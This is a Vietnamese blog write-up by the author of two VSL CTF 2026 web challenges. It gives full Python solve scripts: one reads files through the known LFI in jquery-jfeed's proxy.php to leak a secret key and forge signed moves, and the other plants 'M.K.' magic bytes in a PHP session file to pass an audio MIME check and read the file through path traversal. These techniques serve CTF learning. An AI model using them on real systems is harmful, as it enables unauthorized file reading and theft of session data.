---
title: (VietNamese) VSL CTF 2026 Writeup (Author)
date: 2026-1-28 08:19:33
top_img: /img/VSL/VSL.png
cover: /img/VSL/VSL.png
categories:
  - Web Exploit
  - Writeup CTF
toc: true
---
> Trong cuộc thi `VSL CTF 2026` năm nay, mình có đóng góp một số thử thách mảng Web. Mình rất vui khi VSL năm nay đã thu hút được hàng trăm đội đến từ khắp các miền trên Việt Nam. Đồng thời, mình cũng vô cùng tự hào khi team mình `VSL.Sp33d_Of_T1m3` đã giành Quán quân bảng A và lọt Top 7 bảng B (toàn quốc).
![alt text](/img/VSL/image-33.png)
> Tôi sẽ đi vào viết chi tiết 2 bài `keygame` và `web easy easy`
## Challenge Key Game
![alt text](/img/VSL/image.png)
### Lý lịch
Hãy chơi nhạc đúng cách, đừng gian lận vì có hệ thống giám sát nghiêm ngặt.
Link : http://124.197.22.141:7878/
### Liệt kê
Khi chúng ta vào trang web hiển thị trò chơi piano không có gì đặc biệt cả 
![alt text](/img/VSL/image-1.png)
### Phân tích mã nguồn 
Để chinh phục thử thách này một cách ngon, chúng ta cần phân tích logic xử lý tại index.php. Mục tiêu cuối cùng là vượt qua 40 bước di chuyển chính xác để kích hoạt đoạn code trả về Flag:
### Logic kiểm tra chữ ký
Tại mỗi bước di chuyển, server yêu cầu một tham số h (hash) để xác thực tính hợp lệ của nước đi:
```php
if ($_GET['act'] === 'move'){
    $step = intval($_GET['step']);
    $side = intval($_GET['side']);
    $user_hash = (string)$_GET['h']; 
    // Công thức tạo chữ ký: md5(SECRET_KEY + "|" + step + "|" + side)
    $expected_hash = md5($SECRET_KEY . "|" . $step . "|" . $side);
    
    if ($user_hash !== $expected_hash) {
        die('err_signature_mismatch');
    }
    // ... kiểm tra nước đi đúng/sai dựa trên $_SESSION['path'] ...
```
Từ đây, ta xác định được 2 "mảnh ghép" còn thiếu để giải quyết bài toán: 
> 1. SECRET_KEY: Cần thiết để giả mạo (forge) chữ ký MD5 hợp lệ
> 2. $_SESSION['path']: Con đường an toàn đã được server định sẵn trong phiên làm việc.
Chúng ta cùng đi vào kiểm tra `Dockerfile`, ta nhận thấy server cài đặt thư viện `libjs-jquery-jfeed`. Đây là một thư viện cũ và nổi tiếng với file proxy.php có lỗi Local File Inclusion (LFI) cực kỳ nghiêm trọng. File proxy.php sử dụng hàm fopen() trên tham số url mà không có bất kỳ sự kiểm soát nào, cho phép chúng ta đọc bất kỳ file nào trên server mà user www-data có quyền truy cập: có thể xem chi tiết.<a href="https://code.p1k3.com/gitea/brennen/jFeed/src/branch/master/proxy.php"> Tại đây</a>
```php
$handle = fopen($_REQUEST['url'], "r"); // LFI tại đây
```
Và chúng ta có thể xem chi tiết Blog về bug<a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/"> jquery-jfeed</a>
![alt text](/img/VSL/bug.png)
### Khai thác
Với những điều kiện ở trên sau đây là quá trình từng bước Exploit:
#### Bước 1: Leak SECRET_KEY
Dựa trên file Dockerfile chúng ta có thể đọc file `/var/www/secret_key.txt` từ server đã ghi ra file thông qua Proxy Gadget: GET /javascript/jquery-jfeed/proxy.php?url=`/var/www/secret_key.txt`
#### Bước 2: Leak Session Path
Sau khi gọi `act=respawn`, server sẽ tạo ra mảng đường đi và lưu vào Session. PHP lưu trữ session tại `/tmp/sess_[PHPSESSID]` hoặc `/var/lib/php/sessions/sess_[PHPSESSID]`. Ta sử dụng LFI để đọc file này: GET `/javascript/jquery-jfeed/proxy.php?url=/tmp/sess_abc123...` Kết quả trả về là một chuỗi PHP Serialized, từ đó ta có thể trích xuất chính xác 40 bước di chuyển (0 hoặc 1).
#### Bước 3: Tấn công giả mạo chữ ký
Tôi sẽ sử dụng script python để tự động hóa quá trình xử lí
> 1. Tính toán mã MD5 cho từng bước dựa trên SECRET_KEY và Path đã leak
> 2. Gửi tuần tự 40 request move lên server Khi thực hiện bước di chuyển cuối cùng bước (thứ 39) với chữ ký hợp lệ, server sẽ thực thi lệnh hệ thống và trả về Flag
<details>
  <summary style="color: red;">Click View Script Solve</summary> <br>

~~~python
import hashlib
import requests
import re

class Exploit:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.GADGET = self.url + "javascript/jquery-jfeed/proxy.php"
    
    def LFI(self, path):
        try:
            response = self.session.get(self.GADGET, params={"url": path}, timeout=5)
            return response.text
        except Exception as e:
            return ""
        
    def get_session_id(self):
        print("[*] Khởi tạo game và lấy Session ID...")
        self.session.get(self.url + "?act=respawn")
        sid = self.session.cookies.get("PHPSESSID")
        if not sid:
            print("[-] Không tìm thấy PHPSESSID trong cookie!")
            exit()
        print(f"[+] PHPSESSID: {sid}")
        return sid
    
    def leak_secret_key(self):
        print("[*] Đang leak SECRET_KEY...")
        # Đọc file chứa secret key trên server
        secret_key = self.LFI("/var/www/secret_key.txt").strip()
        if not secret_key:
            print("[-] Không leak được Key qua LFI.")
            exit()
        print(f"[+] Found SECRET_KEY: {secret_key}")
        return secret_key

    def leak_session_blob(self, sid):
        print(f"[*] Đang tìm file Session để lấy Path...")
        paths = [f"/tmp/sess_{sid}", f"/var/lib/php/sessions/sess_{sid}"]
        for p in paths:
            blob = self.LFI(p)
            if "path|" in blob:
                print(f"[+] Đã tìm thấy Session tại: {p}")
                return blob
        
        print("[-] Thất bại khi leak Session.")
        exit()

    def parse_path(self, blob):
        # Sử dụng Regex để parse mảng serialized của PHP
        matches = re.findall(r'i:(\d+);i:([01]);', blob)
        path_dict = {int(k): int(v) for k, v in matches}
        if len(path_dict) < 40:
            print("[-] Dữ liệu path không đủ 40 bước.")
            exit()
            
        path_list = [path_dict[i] for i in range(40)]
        print(f"[+] Path đã leak: {''.join(map(str, path_list))}")
        return path_list
    
    def run_game(self, secret_key, path_list):
        print("[*] Đang gửi các bước di chuyển có chữ ký...")
        
        for step in range(40):
            side = path_list[step]
            # Tạo hash MD5 đúng theo công thức của server
            h = hashlib.md5(f"{secret_key}|{step}|{side}".encode()).hexdigest()
            
            response = self.session.get(self.url, params={
                "act": "move",
                "step": step,
                "side": side,
                "h": h
            }).text
            if "VSL{" in response:
                flag = response.split("|")[-1]
                print(f"\n[!!!]FOUND FLAG: {flag}")
                return
            elif "ok" in response:
                print(f"Step {step}: OK", end="\r")
            else:
                print(f"\n[-] Thất bại tại bước {step}: {response}")
                break

if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:8000/" 
    exploit = Exploit(BASE_URL)
    sid = exploit.get_session_id()
    key = exploit.leak_secret_key()
    blob = exploit.leak_session_blob(sid)
    path = exploit.parse_path(blob)
    exploit.run_game(key, path)
~~~
</details>

![alt text](/img/VSL/image-4.png)
> FLag: VSL{LFI_v1a_jFeed_Proxy_is_D4ngerous!}
## Kết luận
> Lợi dụng thư viện có lỗ hổng đọc tệp tùy ý trên server
## Challenge Web Easy Easy
![alt text](/img/VSL/image-5.png)
### Lý Lịch
> There are certain mime types that should be ignored; it's actually easy, but not so easy. Hehe.
> Link: http://61.14.233.78:8081/
### Liệt Kê 
Trang chủ ở đây chỉ là một trang `audio` 
![alt text](/img/VSL/image-6.png)
Ngoài ra ứng dụng cũng có thêm chức năng bật sáng tối với theme `light` và `dark`
![alt text](/img/VSL/image-7.png)
Hãy cùng đọc mã nguồn của ứng dụng web và chúng ta xem thử chúng ta có thể phát hiện được gì. Trong thử thách này, chúng ta có thể tải xuống một tập tin<a href="https://github.com/capt-bl4ck0ut/check/tree/main"> mã nguồn</a>.
Sau khi xem xét kĩ mã nguồn chúng ta có thể thấy như sau. Đầu tiên ứng dụng web được code bằng PHP và cờ được lưu trong phiên cookie của ứng dụng: `src/index.php`
```php
<?php
include 'flag.php';
[...]
session_start();
$_SESSION['flag'] = FLAG; /* Flag is in the session here! */
```
`src/flag.php`
```php
<?php
define('FLAG', 'VSL{}');
```
Vậy ở thử thách này mục tiêu của chúng ta bằng cách nào đó đọc được nội dung của cookie phiên và leak lá cờ.
Chúng ta cùng xem kĩ ở file `src/audio.php` tham số của chúng ta là `f` tên tệp được phân tích cú pháp thành hàm `readfile` của PHP
```php
<?php
$file = 'audio/' . $_GET['f'];
if (!file_exists($file)) {
	http_response_code(404); die;
}
$mime = mime_content_type($file);
if (!$mime || !str_starts_with($mime, 'audio')) {
	http_response_code(403); die;
}
header("Content-Type: $mime");
echo "Set Content-Type thành công";
readfile($file);
?>
```
Tuy nhiên ở đây tệp bắt buộc phải bắt đầu bằng MIME `audio`, điều này có thể bảo vệ được đọc tệp tùy ý. Chúng ta co thể bỏ qua loại MIME này không. Và ở `index.php` cài đặt chủ đề cũng được lưu trong cookie phiên của ứng dụng:
```php
$_SESSION['theme'] = $_GET['theme'] ?? $_SESSION['theme'] ?? 'light';
```
Như vậy ứng dụng chúng ta cookie phiên của chúng ta chứa cờ và giá trị chủ đề. Vậy vị trí mặc định của tệp phiên PHP ở đâu thì tôi đã tìm trên google <a href="https://stackoverflow.com/questions/4927850/location-for-session-files-in-apache-php">StackOverFlow</a> nói đến vị trí mặc định nằm ở `php.ini` trong `session.save_path`
Vì vị trí lưu trữ các tập tin phiên dựa trên tập tin cấu hình, chúng ta có thể xây dựng ảnh Docker được cung cấp, chạy nó và kiểm tra cấu hình mặc định.
Trong trường hợp `Dockerfile` ứng dụng nó di chuyên `$PHP_INI_DIR/php.ini-production` vào `$PHP_INI_DIR/php.ini`.
```Dockerfile
FROM php:8.3-apache
RUN mv "$PHP_INI_DIR/php.ini-production" "$PHP_INI_DIR/php.ini"
COPY src/ /var/www/html/
COPY docker/entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```
Và tài liệu chính thức<a href="https://www.php.net/manual/en/session.configuration.php#ini.session.save-path"> PHP</a> vị trí mặc định tại `/tmp`
RỒi bây giờ chúng ta cùng thử nghiệm bằng cách triển khai với `Dockerfile` hình ảnh
![alt text](/img/VSL/image-8.png)
Tiếp theo thực hiện kết nối shell tới container Docker:
![alt text](/img/VSL/image-9.png)
Tiếp theo chúng ta muốn lấy tệp phiên thì chỉ cần GET `/` tới ứng dụng
![alt text](/img/VSL/image-10.png)
Chúng ta tiếp theo có thể truy cập thư mục `/tmp` và để xem SESSION
![alt text](/img/VSL/image-11.png)
Ở đây như chúng ta thấy tên tệp phien PHP là `sess_PHPSESSION` và chúng ta cat nội dung ở bên trong
![alt text](/img/VSL/image-12.png)
Tên tệp phiên PHP chứa đối tượng được tuần tự hóa PHP, trong đó `flag` khóa có giá trị chuỗi dài 5 `VSL{}` và `theme` khóa có giá trị chuỗi dài 5 `light`
Chúng ta có thể điều khiển `theme` giá trị của khóa chứ? Vậy nếu ta đánh lừa hàm PHP `mime_content_type` để nó trở thành một tệp âm thanh trong tệp phiên của mình thì sao ?
Và ở tài liệu <a href="https://www.php.net/manual/en/function.mime-content-type.php">mime_content_type</a> chúng ta có thể thấy tài liệu có nói đến:
> Trả về kiểu nội dung MIME của một tệp được xác định bằng cách sử dụng thông tin từ tệp magic.mime 
Sau đó tôi thử tim kiếm google với từ khóa `Bypass Magic Mime` chúng ta có thể thấy trang <a href="https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime">GitHub</a>
Chúng ta có thể thấy định dạng của danh sách các loại MIME này:
```txt
# The format is 4-5 columns:
#    Column #1: byte number to begin checking from, ">" indicates continuation
#    Column #2: type of data to match
#    Column #3: contents of data to match
#    Column #4: MIME type of result
#    Column #5: MIME encoding of result (optional)
```
Chúng ta cùng lấy 1 ví dụ:
```txt
# Real Audio (Magic .ra\0375)
0   belong      0x2e7261fd  audio/x-pn-realaudio
```
Ở ví dụ trên nó bắt đầu từ byte đầu tiên là `0` với cột đầu tiên. Cột thứ ba là nội dung PHP sẽ cố gắng khớp hay còn gọi nó là kiểu chữ ký tệp dùng để xác định hoặc xác minh nội dung của tệp. Vì vậy trong trường hợp trên, nếu PHP tìm thấy mã nhận dạng tệp (file magic number) `0x2e7261fd` bắt đầu từ byte số `0` nó sẽ nhận dạng là tệp kiểu MIME `audio/x-pn-realaudio`
Vậy có byte nào không bắt đầu 0 mà có thể bypass kiểu MIME `audio` thì tôi tìm thấy được 
```txt
#audio/x-screamtracker-module
1080    string  M.K.        audio/x-mod
```
## Khai thác
Với các thông tin đã phân tích chúng ta có thể đi vào quy trình khai thác:
> 1. Chúng ta có thể thêm `/audio/x-screamtracker-module` mã số đặc biệt `M.K.` bằng cách này nếu chúng ta có thể ghi đè được mã số đặc biệt vào vị trí 1080 byte thông qua phương thức GET với `theme` tham số để xác định bypass MIME
> 2. Sau đó lợi dụng LFI để duyệt thư mục đọc tệp `/tmp/sess_SESSION` qua GET tham số `f` để đọc tệp FLAG trong session
<details>
  <summary style="color: red;">Click View Script Solve</summary> <br>

~~~python
import requests
import re
from threading import Thread
import sys
class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL
        self.php_session = "PHPSESSID"
        self.php_location_session = '/tmp/sess_'
        self.magic_byte_offset = 1080
        self.signal = 'M.K.'
        self.LFI = "../../../../../../../../"
        self.flag_regex = re.compile(r'(VSL\{.*?\})')
    
    def magicNumber(self, offset):
        filePrefixLength = len('flag|s:5:"VSL{}";theme|s:1337:"";')
        # Tạo chuỗi đệm sao cho chuỗi 'M.K.' nằm đúng vị trí 1080
        padding_len = self.magic_byte_offset - filePrefixLength - offset
        if padding_len < 0: return None
        sessionContent = ('X' * padding_len) + self.signal
        paramTheme = {"theme": sessionContent}
        response = requests.get(self.baseURL, params=paramTheme)
        return response.cookies.get(self.php_session)
    
    def get_flag(self, sessionCookie, offset):
        if not sessionCookie: return
        fileParam = f"{self.LFI}{self.php_location_session}{sessionCookie}"
        audioURL = f"{self.baseURL}/audio.php"
        response = requests.get(audioURL, params={'f': fileParam})
        if response.status_code == 200:
            match = re.search(self.flag_regex, response.text)
            if match:
                print(f"\n[+] Success! Triggered Audio MIME at offset: {offset}")
                print(f"[+] Found FLAG: {match.group(1)}")
                sys.exit(0) 

    def run_exploit(self, offset):
        print(f"[*] Testing offset {offset}...", end='\r')
        sessionCookie = self.magicNumber(offset)
        self.get_flag(sessionCookie, offset)

if __name__ == "__main__":
    TARGET_URL = "http://61.14.233.78:8081"
    exp = Exploit(TARGET_URL)
    threads = []
    for offset in range(-50, 50):
        t = Thread(target=exp.run_exploit, args=(offset,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
~~~
</details>

![alt text](/img/VSL/image-13.png)
> FLAG: VSL{LFI_PhP_Wha7_4_M1M3_7yp3_ByP455_0a293b8f1c7d4e5f}

## Kết luận
> Bỏ qua bộ lọc loại MIME MAGIC của tệp PHP